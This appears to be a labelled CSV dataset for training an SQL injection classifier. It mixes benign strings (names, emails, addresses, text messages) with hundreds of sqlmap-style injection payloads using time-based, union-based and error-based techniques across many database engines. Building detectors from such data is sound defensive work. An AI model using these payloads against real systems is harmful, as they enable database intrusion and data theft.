payload,label
crast_litel@cortell.al,0
",(BEGIN IF (2329=2329) THEN DBMS_LOCK.SLEEP(5); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",1
Mustang,0
Ofcourse I also upload some songs,0
We can go 4 e normal pilates after our intro...  ,0
"TAAm"") WHERE 2972=2972 RLIKE SLEEP(5)#",1
kaefer,0
cbHd')) AS pfYB WHERE 9098=9098 HAVING 9856=2940-- DJuW,1
pleitas,0
wildcat,0
"-1487"" )  as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1
vettenranta@infopromo.az,0
"vyHv`) WHERE 7697=7697 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xYww",1
' IN BOOLEAN MODE) AND 8081=3677#,1
""")) AS GlVS WHERE 2209=2209 AND (SELECT 3093 FROM (SELECT(SLEEP(5)))nwfe)#",1
uribitarte 72 13?g,0
Im done. Just studyn in library,0
papadouka_cuttinet@professionalhosting.com.il,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"" AND (SELECT (CASE WHEN (6364=8357) THEN NULL ELSE CAST((CHR(75)||CHR(88)||CHR(105)||CHR(120)) AS NUMERIC) END)) IS NULL-- OAWB",1
17840,0
15198367j,0
jasmann,0
sqlmap/1.4.4#stable (http://sqlmap.org)' ORDER BY 5282#,1
humanitari9mo,0
));SELECT (CASE WHEN (8046=6589) THEN 8046 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL--,1
"sexC' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"calle la merce, 120",0
ezella,0
""" OR EXTRACTVALUE(2657,CONCAT(0x5c,0x7176707171,(SELECT (ELT(2657=2657,1))),0x716a786a71)) AND ""kEfM""=""kEfM",1
kerlovic,0
serrano,0
"cbHd'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FUPK",1
"vUXo"") AS vrtA WHERE 7962=7962 AND (5136=8319)*8319-- PuLK",1
8407,0
-7847' OR 3583=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (3583=3583) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND 'ffVc' LIKE 'ffVc,1
"TAAm'))) AND 4629=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(78)||CHR(114)||CHR(82),5)--",1
"1'  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'jueq' = 'jueq",1
24220,0
"-2557) AS MLCl WHERE 5007=5007 UNION ALL SELECT 5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007,5007#",1
cbHd)) AS NHgO WHERE 8985=8985;SELECT (CASE WHEN (6992=9131) THEN 6992 ELSE 6992*(SELECT 6992 FROM INFORMATION_SCHEMA.PLUGINS) END)#,1
atontamiento,0
postema,0
danila,0
"-2550"")) UNION ALL SELECT 8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925,8925-- GSwc",1
9ein6e0a3,0
""" OR 2426=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
"calle matula, s/n,",0
"))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WrVS",1
boobs,0
Er yeah i will b there at 15:26 sorry! Just tell me which pub/cafe to sit in and come wen u can,0
"DtRW')) AS MhXN WHERE 5012=5012 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
introduccin,0
pujolaso faucheux,0
histri985ent0,0
"-6482`) WHERE 5604=5604 UNION ALL SELECT 5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604,5604-- umIg",1
Babes I think I got ur brolly I left it in English wil bring it in 2mrw 4 u luv Franxx,0
"-1349"" OR MAKE_SET(8270=6126,6126) AND ""BmBn""=""BmBn",1
garde3@gay-tantra.kw,0
')) ORDER BY 7304#,1
Ok. There may be a free gym about.,0
lezo,0
"'||(SELECT CHR(74)||CHR(67)||CHR(120)||CHR(79) WHERE 1331=1331 AND 2471=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--",1
11051984,0
ghose@perrosmodelo.tr,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""uqor"" like ""uqor",1
-1709') OR 1134=5054#,1
"sexC"") WHERE 8612=8612 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(6560=6560,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- xvIr",1
jessica,0
"TAAm"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UDuC",1
9ig7a2i4,0
orion,0
"DtRW') WHERE 1634=1634 AND ROW(6867,7683)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(6867=6867,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 5679 UNION SELECT 9446 UNION SELECT 4387 UNION SELECT 7787)a GROUP BY x)-- YbJQ",1
"vyHv') AS TPSd WHERE 9171=9171 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZGhS",1
7676907583941560,0
TAAm') AND 7811=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7811=7811) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- HfwI,1
"https://keystrokebiometrics.xyz:443/)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-1636"" OR 9770=('qvpqq'||(SELECT CASE 9770 WHEN 9770 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qjxjq')-- cJVb",1
"sqlmap/1.4.4#stable (http://sqlmap.org)"" OR ELT(5689=5689,SLEEP(5)) AND ""vFQR"" LIKE ""vFQR",1
I am in hospital da. . I will return home in evening,0
"-3835"") UNION ALL SELECT 7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015,7015-- TNan",1
sexC) AS TkUo WHERE 6752=6752 OR 1832=(SELECT 1832 FROM PG_SLEEP(5))--,1
"vyHv"") AS RzJH WHERE 7040=7040 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GeRz",1
"cami son anglada, s/n",0
larisa,0
"sqlmap/1.4.4#stable (http://sqlmap.org)' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GaTw",1
8012253702008773,0
blow,0
"'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bUHh",1
1606552249491882,0
"-6191"")) UNION ALL SELECT 4181,4181,4181-- CIZs",1
aldearrodrigo,0
"` WHERE 5842=5842 AND 3618=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))-- mCct",1
(4985=1662)*'',1
kipp,0
kari,0
"sexC'+(SELECT ASCII_CHAR(77)||ASCII_CHAR(106)||ASCII_CHAR(108)||ASCII_CHAR(87) WHERE 6463=6463 OR 4675=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))+'",1
amancio,0
"sexC"" AND 1076=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- ZwEG",1
") WHERE 4824=4824 AND CHAR(119)||CHAR(111)||CHAR(98)||CHAR(109)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5637),0),5000000000),NULL)-- YCdH",1
12,0
) AS sbMF WHERE 6627=6627 UNION ALL SELECT NULL-- NxQl,1
"https://keystrokebiometrics.xyz:443/"")) RLIKE SLEEP(5) AND ((""EJtW"" LIKE ""EJtW",1
"-2968)) UNION ALL SELECT 4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881,4881-- SOxD",1
dieciseisavo,0
asan8,0
karem,0
-2690')) OR 9025=(SELECT (CASE WHEN (9025=5027) THEN 9025 ELSE (SELECT 5027 UNION SELECT 8917) END))-- cZVc,1
emp34h82o,0
"1'+ ( select 'yzxc' where 5230 = 5230  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )    )  )  +'",1
"-6474' UNION ALL SELECT 5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882,5882-- CxrA",1
"https://keystrokebiometrics.xyz:443/'||(SELECT CHR(107)||CHR(119)||CHR(101)||CHR(83) FROM DUAL WHERE 5922=5922 AND 2022=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",1
"-6344"")) AS CXRA WHERE 3858=3858 UNION ALL SELECT 3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858,3858#",1
1)) as zpvn where 2767=2767 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1
I will come tomorrow di,0
jaln de cameros,0
-1053'))) OR 9862=3508-- JUES,1
"') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(5879=5879,1))),0x716a786a71,0x78))x)) AND ('eNSi'='eNSi",1
chalia,0
"1%"");select (case when (6179=8476) then 6179 else cast(1 as int)/(select 0 from dual) end) from dual--",1
"c/ pista, 101",0
"vyHv))) OR (SELECT 8738 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(8738=8738,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((2106=2106",1
-3567 OR 4967=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4967=4967) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)# iHdn,1
"1%"" or sleep(5) and ""%""=""",1
"vUXo',(CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT 1 FROM GENERATE_SERIES(6871,6871,CASE WHEN (6871=6871) THEN 1 ELSE 0 END) LIMIT 1)::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC))-- JGnA",1
"-9166"")) UNION ALL SELECT 9788,9788,9788,9788,9788,9788,9788,9788,9788,9788,9788,9788-- qYmy",1
"sqlmap/1.4.4#stable (http://sqlmap.org)') OR CHAR(84)||CHAR(74)||CHAR(110)||CHAR(75)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(2457),0),5000000000),NULL)-- mFGI",1
"-6406')) AS ceLw WHERE 5529=5529 UNION ALL SELECT 5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529,5529#",1
"` WHERE 8557=8557 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1
"1%' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( '%' = '",1
"cbHd+(SELECT CHAR(109)+CHAR(67)+CHAR(65)+CHAR(87) WHERE 3460=3460 OR 6467=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+",1
"1) as lejp where 5238=5238 union all select null,null,null,null,null#",1
"cbHd"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-3567""))) OR 9836=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 9836 WHEN 9836 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)) AND (((""Sjfq"" LIKE ""Sjfq",1
romn,0
"sexC)) AS hHQA WHERE 3297=3297 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
antanas,0
ermindo,0
amstel,0
"-9070` WHERE 9716=9716 UNION ALL SELECT 9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716,9716#",1
Hey what how about your project. Started aha da.,0
27915,0
rodo de la cerda,0
"1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",1
buttfuck,0
car,0
bezoar,0
"cami antic animeta 43,",0
"TAAm))) AND ELT(1729=3108,3108) AND (((7159=7159",1
9380,0
tafler@lamarsrl.ck,0
v$idr3ar,0
"cbHd') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
""") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- syGP",1
") AS yMGN WHERE 1211=1211 (SELECT (CASE WHEN (4881=4881) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4881),0),500000000),NULL) ELSE CHAR(121)||CHAR(101)||CHAR(67)||CHAR(115) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- EwWq",1
escudern,0
rivers,0
"DtRW"" WHERE 5388=5388 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2945=2945,1))),0x716a786a71,0x78))x))-- WFmT",1
"-8237 UNION ALL SELECT 4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101,4101-- hHdZ",1
tyler,0
"cbHd""))) AND UPDATEXML(7500,CONCAT(0x2e,0x7176707171,(SELECT (ELT(7500=7500,1))),0x716a786a71),7878) AND (((""NQJN""=""NQJN",1
kindra,0
"TAAm' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(7946=7946,1))),0x716a786a71,0x78))x)) AND 'RjzF'='RjzF",1
plza. maimonides 197,0
"DtRW"" OR 8533=(SELECT 8533 FROM PG_SLEEP(5)) AND ""tWgC""=""tWgC",1
"-4554) OR 7539=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7539=7539) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- cGAE",1
2146778309020113,0
This is the 2nd time we have tried to contact u. U have won the £1450 prize to claim just call 09053750005 b4 310303. T&Cs/stop SMS 08718725756. 140ppm,0
lightnin@grupodescansoyhogar.web,0
"cbHd"")) AND ROW(9691,4208)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(9691=9691,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 9586 UNION SELECT 4515 UNION SELECT 6281 UNION SELECT 9360)a GROUP BY x) AND ((""xBcB"" LIKE ""xBcB",1
"select * from generate_series ( 9863,9863,case when  ( 9863 = 3285 )  then 1 else 0 end )  limit 1--",1
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",1
spencer,0
-7000 ORDER BY 1#,1
eating,0
"DtRW"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
balcells parets,0
summit,0
d_eslechar,0
remberta,0
"-8106%"" )  union all select 2051,2051,2051,2051,2051,2051#",1
"https://keystrokebiometrics.xyz:443/') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
lupien,0
"https://keystrokebiometrics.xyz:443/"")) AS rLXJ WHERE 4894=4894 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"vyHv"") WHERE 3649=3649 AND 3380=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- YABR",1
armua,0
braden,0
20098056n,0
girls,0
"https://keystrokebiometrics.xyz:443/"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AdwU",1
You have to pls make a note of all she.s exposed to. Also find out from her school if anyone else was vomiting. Is there a dog or cat in the house? Let me know later.,0
"https://keystrokebiometrics.xyz:443/""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
burning,0
"-2049"" WHERE 5014=5014 OR 7990 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7990=7990) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- fXZp",1
-7817')) AS ikjY WHERE 3616=3616 OR 1237=1026#,1
25136,0
",(SELECT (CASE WHEN (8855=6645) THEN '' ELSE 8855*(SELECT 8855 UNION ALL SELECT 6645) END))",1
centeno polanco,0
nahiara,0
"' OR 1203=BENCHMARK(5000000,MD5(0x7463664c))#",1
135790,0
"vyHv' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"sexC"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pWeV",1
e88r6bera,0
And very importantly all we discuss is between u and i only.,0
"1"" where 8234=8234;select (case when (4291=6937) then 4291 else 4291*(select 4291 from mysql.db) end)#",1
aula,0
d5sm7lad7,0
78945612,0
1')) and 3526=1354,1
"-4720') OR 1204=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (1204=1204) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))-- IbyQ",1
"https://keystrokebiometrics.xyz:443/ OR UPDATEXML(3671,CONCAT(0x2e,0x7176707171,(SELECT (ELT(3671=3671,1))),0x716a786a71),7653)",1
3465134997553259,0
pierre,0
2720344476520602,0
janssen,0
tarheel,0
jiao,0
"-3135"")) AS SgRi WHERE 9850=9850 OR 5764=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (5764=5764) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))-- Azjy",1
I'm e person who's doing e sms survey...,0
-1628))) OR 5726=5518#,1
96,0
"vyHv"")) AND 6230=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND ((""hjaM""=""hjaM",1
hanzlice,0
""")) AS JkDt WHERE 6293=6293 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"sqlmap/1.4.4#stable (http://sqlmap.org)) WHERE 9295=9295 AND 1180=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- WAHc",1
"-1076') UNION ALL SELECT 6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593,6593#",1
I don't want you to leave. But i'm barely doing what i can to stay sane. fighting with you constantly isn't helping.,0
cosmo@vilainstal.sv,0
"')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XehX",1
carla,0
aristizbal faura,0
-9363%' or  ( 8459 = 8459 ) *4906 and '%' = ',1
"-2180) OR (SELECT (CASE WHEN (9375=8077) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9375) END) FROM DUAL) IS NULL AND (6734=6734",1
This is my number by vivek..,0
rehenchida,0
"' WHERE 1910=1910 OR ROW(3959,3860)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(3959=3959,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 3610 UNION SELECT 3743 UNION SELECT 3300 UNION SELECT 1420)a GROUP BY x)-- xMHp",1
"https://keystrokebiometrics.xyz:443/"")) AS xYiV WHERE 9037=9037 AND 2187=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (2187=2187) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))-- QCWB",1
violetta,0
oficial ribe,0
"1') as juxt where 5956=5956 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"'+(SELECT CHAR(105)+CHAR(71)+CHAR(106)+CHAR(97) WHERE 5768=5768 AND 7191=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))+'",1
TAAm) WHERE 5105=5105 AND 7638=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (7638=7638) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- rFmJ,1
olmeda de la cuesta,0
"sqlmap/1.4.4#stable (http://sqlmap.org) AND 4974=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(77)||CHR(110)||CHR(69),5)# fDLN",1
DtRW'+(SELECT 0x544e7550 WHERE 5520=5520 RLIKE SLEEP(5))+',1
gil,0
acabronada,0
"UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Pstt",1
